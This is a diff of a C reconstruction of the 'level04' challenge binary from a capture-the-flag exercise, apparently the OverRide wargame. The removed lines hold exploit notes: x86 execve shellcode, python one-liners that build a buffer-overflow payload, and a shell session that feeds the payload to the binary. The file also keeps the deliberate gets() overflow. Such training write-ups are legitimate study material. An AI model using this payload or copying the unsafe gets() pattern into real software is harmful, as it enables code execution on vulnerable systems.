@@ -1,56 +1,49 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <sys/types.h>
+// #include <linux/prctl.h>
 
-#include  "sys/wait.h"
+// void enable_timeout_cons(void)
+// {
+// 	signal(0xe, prog_timeout);
+// 	alarm(0x3c);
+// 	return;
+// }
+
 
 int		main(void)
-
 {
-  int iVar1;
-  int *puVar2;
-  byte bVar3;
-  uint state;
-  int buff [32];
-  uint local_1c;
-  long local_18;
-  __pid_t pid;
-  
-  bVar3 = 0;
-  pid = fork();
-  memset(buff, 0, sizeof(buff));
+	char	buff[128];
+	pid_t 	pid;
+	int		status;
+	int		state;
 
-  local_18 = 0;
-  state = 0;
-  if (pid == 0) {
-    prctl(1, 1);
-    ptrace(0, 0, 0, 0);
-    puts("Give me some shellcode, k");
-    gets((char *)buff);
-  }
-  else {
-    do {
-      wait(&state);
-      state;
-      if (((state & _WSTOPPED) == 0) || (((state & 0x7f) + 1) >> 1) > 0) {
-        puts("child is exiting...");
-        return 0;
-      }
-      local_18 = ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0);
-    } while (local_18 != 0xb);
-    puts("no exec() for you");
-    kill(pid,9);
-  }
-  return 0;
+	pid = fork();
+	bzero(buff, sizeof(buff));
+	status = 0;
+	state = 0;
+	if (pid == 0)   // if we are on the child process
+	{
+		prctl(1, 1);
+		ptrace(PT_TRACE_ME, 0, 0, 0);
+		puts("Give me some shellcode, k");
+		gets(buff);
+	}
+	else // parent gets the child process id 
+	{
+		do {
+			wait(&status);  // block parent process until any of its children has finished.
+			if (((status & _WSTOPPED) == 0) || (((state & 0x7f) + 1) >> 1) > 0) {
+				puts("child is exiting...");
+				return 0;
+			}
+			state = ptrace(PT_READ_U, pid, 0x2c, 0);
+		} while (state != 0xb);   // PT_DETACH       11      /* stop tracing a process */
+		puts("no exec() for you");
+		kill(pid, 9);
+	}
+	return 0;
 }
-python -c 'print  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+ "A"*112 + "\x00\x00\x00\x00" + "A"*12 + "BBBB" + "\xff\xff\xd6\x50"[::-1]'
-python -c 'print  "A"*28 + "A"*112 + "\x00"*4 + "A"*12 + "BBBB" + "\x50\xd6\xff\xff"'
-
-
-char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
-
-
-// size of shellcode is 28
-char shellcode[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-
-
-
-level04@OverRide:~$ python -c 'print "\x90"*112 +  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x00"*4 + "A"*12 + "\x80\xd6\xff\xff"' > /tmp/pyload
-level04@OverRide:~$ (cat /tmp/pyload ; cat ) | /home/users/level04/level04
